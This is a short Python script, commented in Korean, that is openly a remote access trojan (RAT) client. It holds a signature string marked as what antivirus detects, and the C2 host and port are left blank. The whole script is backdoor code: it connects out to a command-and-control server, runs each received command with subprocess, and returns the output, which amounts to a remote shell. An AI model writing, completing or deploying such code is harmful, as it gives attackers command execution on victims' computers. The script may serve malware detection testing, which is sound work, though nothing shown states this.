import socket
import subprocess

# RAT 식별 문자열 (백신이 탐지할 부분)
SIGNATURE = "RAT_CLIENT"

# C2 서버 설정
C2_SERVER = ""
C2_PORT = 

def connect_to_c2():
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((C2_SERVER, C2_PORT))
    while True:
        command = client.recv(1024).decode("utf-8")
        if command.lower() == "exit":
            break
        output = subprocess.getoutput(command)
        client.send(output.encode("utf-8"))
    client.close()

if __name__ == "__main__":
    connect_to_c2()
